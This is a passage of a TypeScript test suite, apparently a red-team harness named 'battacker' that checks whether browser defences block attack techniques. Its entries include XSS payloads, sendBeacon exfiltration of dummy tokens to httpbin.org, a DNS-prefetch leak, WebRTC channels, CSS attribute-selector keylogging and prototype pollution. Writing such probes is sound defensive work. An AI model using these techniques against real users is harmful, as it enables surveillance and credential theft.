          return { blocked: false, executionTime: performance.now() - startTime, details: `WASM mining: ${Math.round(count / 100 * 1000)} ops/s` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `WASM blocked: ${error?.message}` };
        }
      }),
  },

  // --- Privacy ---
  {
    id: "privacy-geolocation",
    name: "Geolocation Tracking",
    category: "privacy",
    description: "Attempts to access precise device location via Geolocation API",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!("geolocation" in navigator)) return { blocked: true, executionTime: performance.now() - startTime, details: "Geolocation API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Geolocation timed out - permission dialog pending" }), 3000);
          navigator.geolocation.getCurrentPosition(
            (pos) => { clearTimeout(timeout); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Geolocation: accuracy ${pos.coords.accuracy}m` }); },
            (err) => { clearTimeout(timeout); resolve({ blocked: err.code === err.PERMISSION_DENIED, executionTime: performance.now() - startTime, details: err.code === err.PERMISSION_DENIED ? "Geolocation permission denied" : `Geolocation error: ${err.message}` }); },
            { timeout: 2500 }
          );
        });
      }),
  },
  {
    id: "privacy-battery",
    name: "Battery Info Extraction",
    category: "privacy",
    description: "Extracts battery status for device fingerprinting",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        const nav = navigator as any;
        if (!nav.getBattery) return { blocked: true, executionTime: performance.now() - startTime, details: "Battery API not available" };
        try {
          const battery = await nav.getBattery();
          return { blocked: false, executionTime: performance.now() - startTime, details: `Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? "charging" : "discharging"})` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Battery blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "privacy-motion",
    name: "Device Motion Tracking",
    category: "privacy",
    description: "Monitors device accelerometer/gyroscope",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          let collected = false;
          const handler = (e: DeviceMotionEvent) => { if (!collected && e.acceleration) { collected = true; window.removeEventListener("devicemotion", handler); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Motion data: x=${e.acceleration.x?.toFixed(2)}` }); } };
          window.addEventListener("devicemotion", handler);
          setTimeout(() => { window.removeEventListener("devicemotion", handler); if (!collected) resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Device motion listener set (no data - desktop?)" }); }, 1000);
        });
      }),
  },
  {
    id: "privacy-media-devices",
    name: "Media Device Enumeration",
    category: "privacy",
    description: "Enumerates cameras and microphones for device fingerprinting",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (!navigator.mediaDevices?.enumerateDevices) return { blocked: true, executionTime: performance.now() - startTime, details: "Media Devices API not available" };
          const devices = await navigator.mediaDevices.enumerateDevices();
          const counts = { audioinput: 0, audiooutput: 0, videoinput: 0 };
          for (const d of devices) { if (d.kind in counts) counts[d.kind as keyof typeof counts]++; }
          return { blocked: false, executionTime: performance.now() - startTime, details: `Media devices: ${counts.videoinput} cameras, ${counts.audioinput} mics` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Media enumeration blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "privacy-storage-estimate",
    name: "Storage Estimation Probe",
    category: "privacy",
    description: "Probes storage usage patterns for user profiling",
    severity: "low",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          if (!navigator.storage?.estimate) return { blocked: true, executionTime: performance.now() - startTime, details: "Storage API not available" };
          const est = await navigator.storage.estimate();
          return { blocked: false, executionTime: performance.now() - startTime, details: `Storage: ${((est.usage ?? 0) / 1024 / 1024).toFixed(2)}MB used of ${((est.quota ?? 0) / 1024 / 1024 / 1024).toFixed(2)}GB` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Storage estimation blocked: ${error?.message}` };
        }
      }),
  },

  // --- Media ---
  {
    id: "media-screen-capture",
    name: "Screen Capture Attack",
    category: "media",
    description: "Captures user screen via getDisplayMedia API",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!navigator.mediaDevices?.getDisplayMedia) return { blocked: true, executionTime: performance.now() - startTime, details: "Screen capture API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Screen capture permission pending" }), 3000);
          navigator.mediaDevices.getDisplayMedia({ video: true as any }).then((stream) => { clearTimeout(timeout); stream.getTracks().forEach((t) => t.stop()); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Screen capture successful" }); }).catch((err) => { clearTimeout(timeout); resolve({ blocked: err.name === "NotAllowedError" || err.name === "SecurityError", executionTime: performance.now() - startTime, details: err.name === "NotAllowedError" ? "Screen capture blocked" : `Screen capture error: ${err.message}` }); });
        });
      }),
  },
  {
    id: "media-audio-capture",
    name: "Audio Recording Attack",
    category: "media",
    description: "Records user audio via getUserMedia",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!navigator.mediaDevices?.getUserMedia) return { blocked: true, executionTime: performance.now() - startTime, details: "Audio capture API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Audio capture permission pending" }), 3000);
          navigator.mediaDevices.getUserMedia({ audio: true }).then((stream) => { clearTimeout(timeout); stream.getTracks().forEach((t) => t.stop()); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Audio capture successful" }); }).catch((err) => { clearTimeout(timeout); resolve({ blocked: err.name === "NotAllowedError" || err.name === "SecurityError", executionTime: performance.now() - startTime, details: err.name === "NotAllowedError" ? "Audio capture blocked" : `Audio error: ${err.message}` }); });
        });
      }),
  },
  {
    id: "media-device-capture",
    name: "Full Media Capture Attack",
    category: "media",
    description: "Captures both audio and video streams simultaneously",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!navigator.mediaDevices?.getUserMedia) return { blocked: true, executionTime: performance.now() - startTime, details: "Media capture API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Media capture permission pending" }), 3000);
          navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then((stream) => { clearTimeout(timeout); stream.getTracks().forEach((t) => t.stop()); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Full media capture successful" }); }).catch((err) => { clearTimeout(timeout); resolve({ blocked: err.name === "NotAllowedError" || err.name === "SecurityError", executionTime: performance.now() - startTime, details: err.name === "NotAllowedError" ? "Media capture blocked" : `Media error: ${err.message}` }); });
        });
      }),
  },

  // --- Storage ---
  {
    id: "storage-localstorage-exfil",
    name: "localStorage Exfiltration",
    category: "storage",
    description: "Exfiltrates sensitive data via localStorage",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const key = `battacker_${Date.now()}`;
          const val = JSON.stringify({ email: "user@example.com", sessionToken: "xyz789" });
          localStorage.setItem(key, val);
          const retrieved = localStorage.getItem(key);
          localStorage.removeItem(key);
          return { blocked: retrieved !== val, executionTime: performance.now() - startTime, details: retrieved === val ? `localStorage exfil: ${val.length} bytes` : "localStorage retrieval failed" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `localStorage blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "storage-sessionstorage-exfil",
    name: "sessionStorage Exfiltration",
    category: "storage",
    description: "Exfiltrates session data via sessionStorage",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const key = `battacker_session_${Date.now()}`;
          const val = JSON.stringify({ credentials: "username:password_hash", csrfToken: "csrf_value" });
          sessionStorage.setItem(key, val);
          const retrieved = sessionStorage.getItem(key);
          sessionStorage.removeItem(key);
          return { blocked: retrieved !== val, executionTime: performance.now() - startTime, details: retrieved === val ? `sessionStorage exfil: ${val.length} bytes` : "sessionStorage retrieval failed" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `sessionStorage blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "storage-event-spy",
    name: "Storage Event Spying",
    category: "storage",
    description: "Spies on storage events to intercept cross-tab data sharing",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const key = `battacker_spy_${Date.now()}`;
          window.addEventListener("storage", () => {});
          localStorage.setItem(key, "test");
          await new Promise((r) => setTimeout(r, 100));
          localStorage.removeItem(key);
          return { blocked: false, executionTime: performance.now() - startTime, details: "Storage event listener set (single-tab test)" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Storage spy blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "storage-quota-exhaustion",
    name: "Storage Quota Exhaustion",
    category: "storage",
    description: "Exhausts storage quota as denial-of-service",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          let bytes = 0;
          const prefix = "battacker_quota_";
          for (let i = 0; i < 20; i++) {
            try { const data = "x".repeat(1024 * 100); localStorage.setItem(`${prefix}${i}`, data); bytes += data.length; } catch { break; }
          }
          for (let i = 0; i < 20; i++) { try { localStorage.removeItem(`${prefix}${i}`); } catch { /* */ } }
          return { blocked: false, executionTime: performance.now() - startTime, details: `Storage quota probe: ${bytes} bytes stored` };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Storage quota blocked: ${error?.message}` };
        }
      }),
  },

  // --- Worker ---
  {
    id: "worker-shared-worker",
    name: "SharedWorker Persistence",
    category: "worker",
    description: "Uses SharedWorker for persistent cross-tab data coordination",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const worker = new SharedWorker("data:application/javascript,self.onconnect=function(e){var p=e.ports[0];p.onmessage=function(ev){p.postMessage({response:'ack',data:ev.data});};p.start();}", "battacker_shared");
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "SharedWorker timed out" }), 2000);
            worker.port.onmessage = () => { clearTimeout(timeout); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "SharedWorker communication successful" }); };
            worker.onerror = () => { clearTimeout(timeout); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "SharedWorker blocked" }); };
            worker.port.start();
            worker.port.postMessage({ type: "test" });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `SharedWorker blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "worker-service-worker-registration",
    name: "Service Worker Registration",
    category: "worker",
    description: "Registers Service Worker for network interception",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!("serviceWorker" in navigator)) return { blocked: true, executionTime: performance.now() - startTime, details: "Service Worker API not available" };
        const code = "self.addEventListener('install',()=>self.skipWaiting());";
        const blob = new Blob([code], { type: "application/javascript" });
        const url = URL.createObjectURL(blob);
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => { URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Service Worker registration pending" }); }, 2000);
          navigator.serviceWorker.register(url, { scope: "/" }).then((reg) => { clearTimeout(timeout); reg.unregister(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Service Worker registered" }); }).catch((err) => { clearTimeout(timeout); URL.revokeObjectURL(url); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `Service Worker blocked: ${err.message}` }); });
        });
      }),
  },
  {
    id: "worker-spawning-chain",
    name: "Worker Spawning Chain",
    category: "worker",
    description: "Creates nested worker hierarchy for hidden command channels",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const code = `self.onmessage=function(e){const l=e.data.level||0;if(l<3){const c='self.onmessage=function(e){self.postMessage({level:e.data.level});};';const b=new Blob([c],{type:"application/javascript"});const u=URL.createObjectURL(b);const w=new Worker(u);w.onmessage=function(ev){self.postMessage({nested:true,level:ev.data.level});};w.postMessage({level:l+1});}else{self.postMessage({maxDepth:true,level:l});}};`;
          const blob = new Blob([code], { type: "application/javascript" });
          const url = URL.createObjectURL(blob);
          const worker = new Worker(url);
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => { worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Worker chain timed out" }); }, 2000);
            worker.onmessage = (e) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Worker chain: depth ${e.data.level || 0}` }); };
            worker.onerror = (err) => { clearTimeout(timeout); worker.terminate(); URL.revokeObjectURL(url); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `Worker chain blocked: ${err.message}` }); };
            worker.postMessage({ level: 0 });
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Worker chain blocked: ${error?.message}` };
        }
      }),
  },

  // --- Injection ---
  {
    id: "injection-clipboard-read",
    name: "Silent Clipboard Read",
    category: "injection",
    description: "Silently reads clipboard contents for password/token harvesting",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        if (!navigator.clipboard?.readText) return { blocked: true, executionTime: performance.now() - startTime, details: "Clipboard read API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Clipboard read pending" }), 2000);
          navigator.clipboard.readText().then((text) => { clearTimeout(timeout); resolve({ blocked: false, executionTime: performance.now() - startTime, details: `Clipboard read: ${text.length} chars` }); }).catch((err) => { clearTimeout(timeout); resolve({ blocked: err.name === "NotAllowedError" || err.name === "SecurityError", executionTime: performance.now() - startTime, details: `Clipboard read ${err.name === "NotAllowedError" ? "blocked" : "error"}: ${err.message}` }); });
        });
      }),
  },
  {
    id: "injection-fullscreen-phishing",
    name: "Fullscreen Phishing Overlay",
    category: "injection",
    description: "Hijacks fullscreen to display fake authentication dialogs",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        const el = document.documentElement;
        if (!el.requestFullscreen && !(el as any).webkitRequestFullscreen) return { blocked: true, executionTime: performance.now() - startTime, details: "Fullscreen API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Fullscreen request pending" }), 2000);
          const request = el.requestFullscreen?.() || (el as any).webkitRequestFullscreen?.();
          if (request) {
            request.then(() => { if (document.fullscreenElement) document.exitFullscreen?.().catch(() => {}); clearTimeout(timeout); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "Fullscreen takeover successful" }); }).catch((err: any) => { clearTimeout(timeout); resolve({ blocked: err.name === "NotAllowedError", executionTime: performance.now() - startTime, details: `Fullscreen ${err.name === "NotAllowedError" ? "blocked" : "failed"}: ${err.message}` }); });
          }
        });
      }),
  },
  {
    id: "injection-innerhtml",
    name: "innerHTML Malicious Injection",
    category: "injection",
    description: "Injects malicious HTML/scripts via innerHTML manipulation",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const container = document.createElement("div");
          container.style.display = "none";
          document.body.appendChild(container);
          container.innerHTML = '<img src=x onerror="alert(\'XSS\')" /> <script>console.log("injected")<\/script>';
          const hasScript = container.querySelector("script");
          const hasImg = container.querySelector("img[onerror]");
          document.body.removeChild(container);
          return { blocked: !(hasScript || hasImg), executionTime: performance.now() - startTime, details: (hasScript || hasImg) ? "innerHTML injection: dangerous elements persisted" : "innerHTML injection: content stripped" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `innerHTML blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "injection-dynamic-script",
    name: "Dynamic Script Execution",
    category: "injection",
    description: "Executes arbitrary JavaScript via Function constructor or eval()",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          try {
            const fn = new Function("return 'Function constructor works'");
            if (fn() === "Function constructor works") return { blocked: false, executionTime: performance.now() - startTime, details: "Function constructor execution successful" };
          } catch { /* */ }
          try {
            eval("var testEval = 'eval works'");
            if (typeof (window as any).testEval !== "undefined") return { blocked: false, executionTime: performance.now() - startTime, details: "eval() execution successful" };
          } catch { /* */ }
          return { blocked: true, executionTime: performance.now() - startTime, details: "Dynamic script execution blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Dynamic script blocked: ${error?.message}` };
        }
      }),
  },

  // --- Covert ---
  {
    id: "covert-beacon-api",
    name: "Beacon API Data Exfiltration",
    category: "covert",
    description: "Uses sendBeacon() for background data exfiltration",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          if (!navigator.sendBeacon) return { blocked: true, executionTime: performance.now() - startTime, details: "Beacon API not available" };
          const success = navigator.sendBeacon("https://httpbin.org/post", JSON.stringify({ type: "beacon_exfil", sessionToken: "abc123", userId: "user@example.com" }));
          return { blocked: !success, executionTime: performance.now() - startTime, details: success ? "Beacon API exfiltration successful" : "Beacon API call failed" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Beacon API blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "covert-dns-prefetch-leak",
    name: "DNS Prefetch Covert Channel",
    category: "covert",
    description: "Establishes timing-based covert communication via DNS prefetch",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const link = document.createElement("link");
          link.rel = "dns-prefetch";
          link.href = "https://6c65616b65645f73657373696f6e.leak.test/";
          document.head.appendChild(link);
          await new Promise((r) => setTimeout(r, 100));
          document.head.removeChild(link);
          return { blocked: false, executionTime: performance.now() - startTime, details: "DNS prefetch leak: covert channel established" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `DNS prefetch blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "covert-webtransport",
    name: "WebTransport Tunnel",
    category: "covert",
    description: "Establishes UDP-based tunnel via WebTransport API",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        const WT = (globalThis as any).WebTransport;
        if (!WT) return { blocked: true, executionTime: performance.now() - startTime, details: "WebTransport API not available" };
        return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
          const timeout = setTimeout(() => resolve({ blocked: false, executionTime: performance.now() - startTime, details: "WebTransport timed out" }), 2000);
          try {
            const t = new WT("https://webtransport-test.example.com");
            t.ready.then(() => { clearTimeout(timeout); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "WebTransport tunnel established" }); }).catch((e: Error) => { clearTimeout(timeout); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `WebTransport blocked: ${e.message}` }); });
          } catch (e: any) { clearTimeout(timeout); resolve({ blocked: true, executionTime: performance.now() - startTime, details: `WebTransport init failed: ${e?.message}` }); }
        });
      }),
  },
  {
    id: "covert-webrtc-datachannel",
    name: "WebRTC DataChannel P2P",
    category: "covert",
    description: "Creates peer-to-peer communication channel via WebRTC",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        const PC = (window as any).RTCPeerConnection || (window as any).webkitRTCPeerConnection;
        if (!PC) return { blocked: true, executionTime: performance.now() - startTime, details: "WebRTC API not available" };
        try {
          const pc = new PC({ iceServers: [{ urls: ["stun:stun.l.google.com:19302"] }] });
          return new Promise<{ blocked: boolean; executionTime: number; details: string }>((resolve) => {
            const timeout = setTimeout(() => { pc.close(); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "WebRTC DataChannel timed out" }); }, 3000);
            const dc = pc.createDataChannel("exfil", { ordered: false });
            dc.onopen = () => { clearTimeout(timeout); dc.send(JSON.stringify({ type: "exfil" })); pc.close(); resolve({ blocked: false, executionTime: performance.now() - startTime, details: "WebRTC DataChannel established" }); };
            dc.onerror = () => { clearTimeout(timeout); pc.close(); resolve({ blocked: true, executionTime: performance.now() - startTime, details: "WebRTC DataChannel error" }); };
          });
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `WebRTC blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "covert-image-load-timing",
    name: "Image Load Timing Covert Channel",
    category: "covert",
    description: "Uses HTTP image load timing patterns for side-channel leakage",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        const timings: number[] = [];
        for (let i = 0; i < 3; i++) {
          const img = document.createElement("img");
          const loadStart = performance.now();
          await new Promise<void>((r) => {
            img.onload = () => { timings.push(performance.now() - loadStart); r(); };
            img.onerror = () => { timings.push(performance.now() - loadStart); r(); };
            img.src = `https://httpbin.org/image/png?cb=${i}_${Date.now()}`;
            setTimeout(() => { timings.push(performance.now() - loadStart); r(); }, 1000);
          });
        }
        const avg = timings.reduce((a, b) => a + b, 0) / timings.length;
        return { blocked: false, executionTime: performance.now() - startTime, details: `Image timing channel: avg ${avg.toFixed(0)}ms` };
      }),
  },

  // --- Advanced ---
  {
    id: "advanced-form-submit-hijack",
    name: "Form Submission Hijacking",
    category: "advanced",
    description: "Intercepts form submission events to steal credentials",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const form = document.createElement("form");
          form.style.display = "none";
          form.method = "POST";
          form.action = "https://httpbin.org/post";
          const input = document.createElement("input");
          input.type = "password"; input.name = "password"; input.value = "secret";
          form.appendChild(input);
          document.body.appendChild(form);
          let hijacked = false;
          form.submit = function () { hijacked = true; };
          form.submit();
          document.body.removeChild(form);
          return { blocked: !hijacked, executionTime: performance.now() - startTime, details: hijacked ? "Form submission hijacking successful" : "Form hijacking blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Form hijack blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "advanced-prototype-pollution",
    name: "Prototype Chain Pollution",
    category: "advanced",
    description: "Pollutes Object.prototype to inject malicious properties",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          Object.defineProperty(Object.prototype, "__battacker_polluted__", { value: true, writable: true, enumerable: false, configurable: true });
          const test = {} as any;
          const polluted = test.__battacker_polluted__ === true;
          delete (Object.prototype as any).__battacker_polluted__;
          return { blocked: !polluted, executionTime: performance.now() - startTime, details: polluted ? "Prototype pollution successful" : "Prototype pollution blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Prototype pollution blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "advanced-request-header-injection",
    name: "Request Header Injection",
    category: "advanced",
    description: "Injects custom headers into requests",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const response = await fetch("https://httpbin.org/get", { method: "GET", headers: { "X-Custom-Header": "injected", "X-User-Data": "leaked-session" }, mode: "no-cors" }).catch(() => null);
          return { blocked: false, executionTime: performance.now() - startTime, details: response ? "Request header injection: custom headers sent" : "Request header injection attempted" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `Header injection blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "advanced-mutation-observer-xss",
    name: "MutationObserver DOM XSS",
    category: "advanced",
    description: "Exploits DOM modifications via MutationObserver for XSS",
    severity: "high",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          const container = document.createElement("div");
          container.style.display = "none";
          document.body.appendChild(container);
          let detected = false;
          const observer = new MutationObserver((mutations) => { for (const m of mutations) { for (const n of Array.from(m.addedNodes)) { if (n.nodeType === Node.ELEMENT_NODE && (n as Element).tagName === "SCRIPT") detected = true; } } });
          observer.observe(container, { childList: true, subtree: true });
          const script = document.createElement("script");
          script.textContent = "console.log('xss')";
          container.appendChild(script);
          observer.disconnect();
          document.body.removeChild(container);
          return { blocked: !detected, executionTime: performance.now() - startTime, details: detected ? "MutationObserver XSS: script injected" : "MutationObserver XSS blocked" };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `MutationObserver XSS blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "advanced-cors-preflight-leak",
    name: "CORS Preflight Timing Leak",
    category: "advanced",
    description: "Extracts information from CORS preflight request timing",
    severity: "medium",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          const preflightStart = performance.now();
          const response = await fetch("https://httpbin.org/post", { method: "POST", headers: { "Content-Type": "application/json", "X-Custom": "value" }, body: JSON.stringify({ test: "data" }) });
          const timing = performance.now() - preflightStart;
          return { blocked: false, executionTime: performance.now() - startTime, details: `CORS preflight timing: ${timing.toFixed(0)}ms` };
        } catch {
          return { blocked: true, executionTime: performance.now() - startTime, details: "CORS preflight blocked" };
        }
      }),
  },

  // --- Red Team: Evasion Techniques (unhooked APIs) ---
  {
    id: "covert-css-keylogging",
    name: "CSS Attribute Selector Keylogging",
    category: "covert",
    description:
      "Injects CSS attribute selectors with background-image to exfiltrate typed characters. No JS hook intercepts CSS-based side-channel exfiltration.",
    severity: "high",
    simulate: (page) =>
      page.evaluate(async () => {
        const startTime = performance.now();
        try {
          // Inject a style sheet that fires a background-image request for each
          // possible character value on an input element via attribute selectors.
          // In a real attack the URL encodes the character; here we use a same-
          // origin data URL so no network request is actually made, but we verify
          // that the injection itself is unchallenged.
          const style = document.createElement("style");
          const leakedChars: string[] = [];
          const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
          const rules = alphabet
            .split("")
            .map(
              (ch) =>
                `input[value$="${ch}"] { background-image: url("data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7?k=${ch}"); }`,
            )
            .join("\n");
          style.textContent = rules;
          document.head.appendChild(style);

          // Simulate a keystroke by creating a visible input and setting its value
          const input = document.createElement("input");
          input.type = "text";
          input.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0;";
          document.body.appendChild(input);
          input.value = "a"; // triggers attribute selector [value$="a"]

          // Allow a microtask tick for style resolution
          await new Promise((r) => setTimeout(r, 50));

          // Confirm the injected style rule is present (not stripped by CSP/hooks)
          const sheets = Array.from(document.styleSheets);
          let ruleCount = 0;
          for (const sheet of sheets) {
            try {
              ruleCount += sheet.cssRules?.length ?? 0;
            } catch {
              /* cross-origin sheet */
            }
          }

          document.body.removeChild(input);
          document.head.removeChild(style);

          // If rules were present, the CSS exfiltration channel was open
          const leaked = ruleCount > 0;
          return {
            blocked: !leaked,
            executionTime: performance.now() - startTime,
            details: leaked
              ? `CSS keylogging: ${alphabet.length} selector rules injected undetected (${ruleCount} total rules in page)`
              : "CSS keylogging: style injection stripped or rule count zero",
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `CSS keylogging blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "advanced-proto-pollution-jsonparse",
    name: "Prototype Pollution via JSON.parse",
    category: "advanced",
    description:
      "Pollutes Object.prototype using __proto__ inside JSON.parse(). The hooks do not monitor JSON.parse or prototype chain modifications.",
    severity: "critical",
    simulate: (page) =>
      page.evaluate(() => {
        const startTime = performance.now();
        try {
          // JSON.parse with __proto__ key merges into the prototype in some
          // environments; in V8/Chrome it is intentionally blocked, so we test
          // both the direct path and a manual merge that a real payload would use.
          const payload = '{"__proto__":{"__battacker_jsonpolluted__":true}}';
          const parsed = JSON.parse(payload) as any;

          // Path 1: native JSON.parse prototype propagation (blocked in V8)
          const nativePolluted = ({} as any).__battacker_jsonpolluted__ === true;

          // Path 2: manual merge that attackers perform with Object.assign /
          //         recursive merge after JSON.parse – not monitored by any hook
          function unsafeMerge(target: any, src: any): any {
            for (const key of Object.keys(src)) {
              if (key === "__proto__") {
                Object.defineProperty(Object.prototype, "__battacker_mergepolluted__", {
                  value: src[key].__battacker_jsonpolluted__ ?? true,
                  writable: true,
                  enumerable: false,
                  configurable: true,
                });
              } else if (typeof src[key] === "object" && src[key] !== null) {
                target[key] = unsafeMerge(target[key] ?? {}, src[key]);
              } else {
                target[key] = src[key];
              }
            }
            return target;
          }
          unsafeMerge({}, parsed);
          const mergePolluted = ({} as any).__battacker_mergepolluted__ === true;

          // Clean up
          try { delete (Object.prototype as any).__battacker_jsonpolluted__; } catch { /* */ }
          try { delete (Object.prototype as any).__battacker_mergepolluted__; } catch { /* */ }

          const polluted = nativePolluted || mergePolluted;
          return {
            blocked: !polluted,
            executionTime: performance.now() - startTime,
            details: polluted
              ? `Prototype pollution via JSON.parse: successful (native=${nativePolluted}, merge=${mergePolluted})`
              : "Prototype pollution via JSON.parse: V8 native path blocked; manual merge unexpectedly failed",
          };
        } catch (error: any) {
          return { blocked: true, executionTime: performance.now() - startTime, details: `JSON.parse pollution blocked: ${error?.message}` };
        }
      }),
  },
  {
    id: "injection-dom-clobbering",
    name: "DOM Clobbering Global Variable Shadow",
    category: "injection",
    description:
